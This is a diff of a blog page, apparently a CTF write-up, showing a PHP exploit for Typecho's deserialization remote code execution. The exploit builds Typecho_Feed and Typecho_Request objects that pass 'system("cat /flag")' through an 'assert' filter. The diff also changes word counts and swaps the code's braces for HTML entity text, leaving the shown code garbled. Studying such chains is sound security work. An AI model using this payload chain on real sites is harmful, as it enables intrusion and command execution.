@@ -441,7 +441,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        644
+                        660
                     </div>
                     
 
@@ -470,14 +470,14 @@
 <span class="token variable">$CMD</span> <span class="token operator">=</span> <span class="token string">'system("cat /flag")'</span><span class="token punctuation">;</span>
 
 <span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span>
-<span class="token punctuation">{</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
     <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string">'RSS 2.0'</span><span class="token punctuation">;</span>
     <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string">'ATOM 1.0'</span><span class="token punctuation">;</span>
 
     <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span>
     <span class="token keyword">private</span> <span class="token variable">$_items</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
         <span class="token comment" spellcheck="true">//$this->_type = $this::RSS2;</span>
 
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATOM1</span><span class="token punctuation">;</span>
@@ -485,19 +485,19 @@
             <span class="token string">'category'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
             <span class="token string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
         <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
 
 <span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span>
-<span class="token punctuation">{</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
     <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token constant">CMD</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
 
 <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
     <span class="token string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
@@ -933,7 +933,7 @@ session_save_
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.6k</span>&nbsp;字
+                class="white-color">46.1k</span>&nbsp;字
             
             
             
